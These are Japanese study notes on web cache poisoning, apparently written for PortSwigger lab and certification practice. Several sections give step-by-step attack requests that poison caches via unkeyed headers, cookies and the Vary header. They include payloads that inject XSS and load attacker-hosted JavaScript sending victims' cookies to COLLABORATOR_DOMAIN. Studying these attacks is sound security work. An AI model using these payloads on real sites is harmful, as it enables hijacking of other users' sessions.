###### キャッシュ設計の欠陥悪用までの流れ概要

1. Unkeyとして使えるヘッダをParam Minerで発見する
2. キャッシュキーに==キャッシュバスターを追加==
3. Unkeyにペイロードを注入してリクエスト。ペイロードがレスポンスに反映されていることを確認する
4. ==キャッシュバスターを削除==し、本来のキャッシュを汚染する

#### XSS配布のためのWebキャッシュポイズニング

###### 具体例

- リクエストとレスポンス
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk
```
```http
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

- このとき`X-Forwarded-Host`([Password reset poisoning](../HTTP%20Host%20header%20attacks/Password%20reset%20poisoning.md#X-Forwarded-Hostとは))の値はOGP(アイキャッチ画像)を動的に生成するために使用され、レスポンスに反映されている。
- そしてキャッシュされるレスポンスであり、かつ、`XFH`がUnkeyの場合XSSペイロードを含むレスポンスでキャッシュを汚染する
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
```http
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

- このとき、`/en?region=uk`にアクセスする他のユーザは汚染されたレスポンスが返されてしまう

###### 関連

- [1. XSSの基本と対策](../../Client-side/XSS/1.%20XSSの基本と対策.md)

###### ステップ

1. Unkeyヘッダの値を操作し、反映される場所を確認する
2.  [4. XSS contexts](../../Client-side/XSS/4.%20XSS%20contexts.md)を参考にXSSペイロードを注入し、キャッシュさせる

## Unkeyed header

###### 基本概念

- リソースインポート＝ページ上で外部のファイルやデータを読み込み、利用すること。例えば、JavaScriptやCSSのようなスタイルシート、あるいは画像や動画などのメディアリソース

- `XFH`がUnkeyで、値を安全に処理していない場合、`attacker.com`のように攻撃者のホストするサーバのホスト名を指定して読み込ませることができる
- 基本的にインデックスページを書き換えるよりもJavaScript等の外部のファイルを攻撃者のファイルに指定するのが良い。

- ↓本来のレスポンス
```http
HTTP/1.1 200 OK
<script src="https://normal-site.com/static/analytics.js"></script>
```
- 悪意あるキャッシュポイズニングで、`XFH`に攻撃者のサーバを指定する
```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: attacker.com
User-Agent: Mozilla/5.0 Firefox/57.0
```
- レスポンスの内容が変わる
```http
HTTP/1.1 200 OK
<script src="https://attacker.com/static/analytics.js"></script>
```

- 攻撃者は`https://attacker.com/static/analytics.js`という悪意あるファイルを作成しサーバにホストしておく。
-　このページにアクセスする他のユーザは外部リソースである`https://attacker.com/static/analytics.js`を読み込んでしまう
### ステップ

###### ↓条件
1. Param Minerの結果、Unkeyとして使えるヘッダがある
2. Unkey ヘッダの値が外部リソース読み込みに使用されている

###### 攻撃
1. Unkeyヘッダにエクスプロイトサーバのドメインを指定し、レスポンスで反映を確認
```http
X-Forwarded-Host: EXPLOIT_DOMAIN
```
![tracking.js](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/tracking.js.png)

2. エクスプロイトサーバに同じ名前でファイルを作成し、悪意あるペイロードをホストしておく
```
/resources/js/tracking.js
```
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

document.location='https://COLLABORATOR_DOMAIN/?cookies='+document.cookie;
```

3. [2. 実装の欠陥の探索](4.%20キャッシュ実装の欠陥の悪用/2.%20実装の欠陥の探索.md#Cacheされている兆候)が出現するまでリクエストする
4. Collaboratorで被害者のcookieを確認
- ⚠️：Viewしても実行されないが、被害者にアクセスされた時に実行されるので気にしない

## Cookie-based Webキャッシュポイズニング

###### 基本概念

- 滅多にないベクター。すぐ修正される
- UnkeyがCookieヘッダ
- Cookieヘッダで指定した値の言語のページを読み込む場合
- 以下のリクエストに対するレスポンスが日本語のページを返すもので、そのレスポンスがキャッシュされるとする
```http
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=jn;
Connection: close
```
- このとき、他のユーザは必ず日本語のページにアクセスする

### ステップ

1. UnkeyがCookieヘッダか？
2. Cookieヘッダの値を操作し、反映箇所を確認する
```http
GET /?cb=123
...
Cookie: fehost=example
```
```http
HTTP/1.1 200 OK
...
"frontend":"example"
```

3. コンテキストにあわせてペイロードをキャッシュさせる(↓未検証)
```http
Cookie: fehost=someString"-document.location='https://COLLABORATOR_DOMAIN/?c='+encodeURIComponent(document.cookie);-"someString
```

## 複数のヘッダを使用したWebキャッシュポイズニング

###### 基本概念と具体例

- 複数のUnkeyヘッダを操作した場合のみ悪用できる
- 例えば、WebサイトがHTTPSを使った安全な通信を要求しているとする。
- HTTPSを強制するために、HTTPS以外のプロトコルを使用するリクエストを受信した場合、Webサイトは自身へのHTTPS通信リダイレクトを生成する
```http
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http
```
```http
HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```
- これ自体では、この動作は必ずしも脆弱ではない。
- しかし、動的に生成されるURLの脆弱性を組み合わせることで、攻撃者はこの動作を悪用して、他のユーザを悪意のあるURLにリダイレクトするレスポンスをキャッシュできるかもしれない

### ステップ

1. インデックスページ(`/`)にParam Minerをかけ、1つ目のUnkeyヘッダを検出する
2. 発見した1つ目のUnkeyヘッダの値を指定したリクエストを送り、挙動を見る
	- リダイレクトが生成されたりする

3. リダイレクトが生成されるリクエスト(1つめのUnkeyヘッダを指定したもの)に対してParam Minerをかけ、2つ目のUnkeyヘッダを検出する
4. 2つ目のUnkeyヘッダも加える。値を任意のものに変更し外部リソースへアクセスしている部分に、反射されていることを確認
![[Pasted image 20240210180926.png]]

5. エクスプロイトサーバに同じ名前でファイルを作成し、悪意あるペイロードをホストしておく
```
/resources/js/tracking.js
```
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

document.location='https://COLLABORATOR_DOMAIN/?c='+document.cookie;
```

## 必要以上の情報を提供するレスポンスの悪用

### Vary header

- [Mozilla: Vary](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Vary)
- ==Cache Keyとして追加のヘッダを指定する==
- 例えば、`User-Agent`ヘッダがキーになるように指定するためによく使われる。これは、Webサイトのモバイル版がキャッシュされたときに、誤ってPC版にも提供されることを防ぐ狙いがある
```http
Vary: User-Agent
```

###### 悪用方法概要

- `Vary`で指定されたヘッダが`User-Agent`の場合、`User-Agent`がCache keyとなるので、ターゲットユーザ達のUser-Agentを特定して、ターゲットユーザに被害が及ぶように調整できる
- また、Webサイトのアクセスに最もよく使われる`User-Agent`を特定し、広範囲に影響を及ぼすようにできる

#### VaryヘッダがCache keyのときの悪用方法

1.  `/`ページにParam Minerをかけ、Unkeyを発見
2. Unkeyへの入力が、外部リソース呼び出しに反射されていることを確認
3. エクスプロイトサーバに同じ名前でファイルを作成し、悪意あるペイロードをホストしておく
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

alert(document.cookie);
```

4. レスポンスに`Vary`があることを確認。指定されたヘッダはCache Keyである(ここでは`User-Agent`)
```http
Vary: User-Agent
```

5. 被害者がアクセスするページ(コメント等)に、攻撃者のページへのアクセスを誘導するリンクを掲載する
```html
<img src="http://EXPLOIT_DOMAIN/any">
```

6. 被害者のユーザと思われるIPアドレスの`User-Agent`の値をコピーする
	- アクセスがあるまで何度かreloadする必要があるかも

7. コピーした`User-Agent`の値で、ステップ2のキャッシュポイズニングのリクエストの`User-Agent`の値を上書きし、キャッシュさせる

### Pragma: x-get-cache-key

- レスポンスに`X-Cache-Key: [Cache key]`を返す
- これはPortSwigger独自のヘッダ。本来は`Pragma: akamai-x-get-cache-key"
	- (`X-*`系はPortSwigger独自。サポートに問い合わせた)
